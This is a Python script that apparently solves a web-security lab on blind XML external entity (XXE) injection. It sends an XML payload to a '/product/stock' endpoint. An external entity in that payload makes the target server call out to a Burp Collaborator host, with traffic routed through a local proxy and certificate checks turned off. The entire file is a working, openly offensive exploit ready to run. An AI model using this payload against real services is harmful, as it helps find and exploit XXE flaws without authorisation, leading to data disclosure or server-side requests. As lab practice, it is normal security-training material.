import requests
import urllib3
from sys import argv
				
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

					# set this proxy for burp
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


def get_website_url():
	if len(argv) != 2:
		print(f"[+] usage {argv[0]} <url>")
		print(f"[+] example {argv[0]} http://example.com")
		exit(-1)
	if argv[1][-1] == '/':
		url = argv[1][:-1]
	else:
		url = argv[1]
	return url


def blind_xxe_with_burp_colaboritor(url):
	stock_path = '/product/stock'
						# change this 
	burp_colaboritor_url = 'http://413sptw6nb67mnwb5rytse12nttjh8.oastify.com'
	xxe_payload = f'<?xml version="1.0" encoding="UTF-8"?>\
				   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{burp_colaboritor_url}"> ]>\
				   <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'

	r = requests.post(url + stock_path, data=xxe_payload, verify=False, proxies=proxies)
	print(r.text)
	print('[!] check burp colaboritor')


print("[+] Starting attack")
blind_xxe_with_burp_colaboritor(get_website_url())

